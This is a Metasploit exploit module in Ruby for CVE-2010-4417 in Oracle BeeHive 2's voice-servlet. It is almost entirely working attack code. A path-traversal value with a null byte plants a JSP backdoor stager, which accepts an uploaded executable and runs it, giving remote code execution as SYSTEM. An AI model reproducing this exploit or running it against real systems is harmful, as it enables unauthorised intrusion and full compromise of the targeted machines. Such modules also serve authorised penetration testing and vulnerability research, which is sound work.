# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Oracle BeeHive. The processEvaluation method
        found in voice-servlet can be abused to write a malicious file onto the target machine, and
        gain remote arbitrary code execution under the context of SYSTEM.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;1c239c43f521145fa8385d64a9c32243&#039;,        # Found the vuln first
          &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # https://twitter.com/ae0n_ (overlapped finding & PoC)
          &#039;sinn3r&#039;                                   # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2010-4417&#039; ],
          [ &#039;ZDI&#039;, &#039;11-020&#039; ],
          [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;RPORT&#039; => 7777
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Oracle Beehive 2&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jun 09 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Oracle Beehive&#039;s base directory", &#039;/&#039;])
      ], self.class)
  end


  def check
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa&#039;, &#039;showRecxml.jsp&#039;))

    if res && /RECXML Prompt Tester/ === res.body
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def exploit
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, &#039;Target does not appear to be Oracle BeeHive&#039;)
    end

    # Init some names
    exe_name = "#{Rex::Text.rand_text_alpha(5)}.exe"
    stager_name = "#{Rex::Text.rand_text_alpha(5)}.jsp"

    print_status("Stager name is: #{stager_name}")
    print_status("Executable name is: #{exe_name}")

    # pwd:
    # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\home
    # Targeted path:
    # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\BEEAPP\applications\voice-servlet\voice-servlet\prompt-qa
    register_files_for_cleanup(
      "../BEEAPP/applications/voice-servlet/voice-servlet/prompt-qa/#{stager_name}"
    )


    # Ok fire!
    print_status("Uploading stager...")
    res = upload_stager(stager_name, exe_name)

    # Hmm if we fail to upload the stager, no point to continue.
    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out.&#039;)
    end

    print_status("Uploading payload...")
    upload_payload(stager_name)
  end


  # Our stager is basically a backdoor that allows us to upload an executable with a POST request.
  def get_jsp_stager(exe_name)
    jsp = %Q|<%@ page import="java.io.*" %>
<%
  ByteArrayOutputStream buf = new ByteArrayOutputStream();
  BufferedReader reader = request.getReader();
  int tmp;
  while ((tmp = reader.read()) != -1) { buf.write(tmp); }
  FileOutputStream fostream = new FileOutputStream("#{exe_name}");
  buf.writeTo(fostream);
  fostream.close();
  Runtime.getRuntime().exec("#{exe_name}");
%>|

    # Since we&#039;re sending it as a GET request, we want to keep it smaller so
    # we gsub stuff we don&#039;t want.
    jsp.gsub!("\n", &#039;&#039;)
    jsp.gsub!(&#039;  &#039;, &#039; &#039;)
    Rex::Text.uri_encode(jsp)
  end


  # Stager will be found under:
  # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\BEEAPP\applications\voice-servlet\voice-servlet\prompt-qa\
  def upload_stager(stager_name, exe_name)
    jsp_stager = get_jsp_stager(exe_name)
    uri = normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa&#039;, &#039;showRecxml.jsp&#039;)
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => uri,
      &#039;encode_params&#039; => false, # Don&#039;t encode %00 for us
      &#039;vars_get&#039; => {
        &#039;evaluation&#039; => jsp_stager,
        &#039;recxml&#039; => "..\\#{stager_name}%00"
      }
    })
  end

  # Payload will be found under:
  # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\home\
  def upload_payload(stager_name)
    uri = normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa&#039;, stager_name)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => uri,
      &#039;data&#039; => generate_payload_exe(code: payload.encoded)
    })
  end

  def print_status(msg)
    super("#{rhost}:#{rport} - #{msg}")
  end

end

